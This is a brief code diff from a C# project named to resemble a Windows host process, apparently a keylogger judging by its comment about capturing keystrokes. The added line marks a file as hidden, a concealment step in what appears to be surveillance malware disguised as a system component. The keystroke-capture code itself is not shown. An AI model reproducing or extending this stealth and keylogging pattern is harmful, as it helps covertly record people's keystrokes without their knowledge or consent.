@@ -29,6 +29,7 @@ namespace Windows_Local_Host_Process
                 {
 
                 }
+                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
             }
 
             //1 - capture keystrokes and displaying in the console 
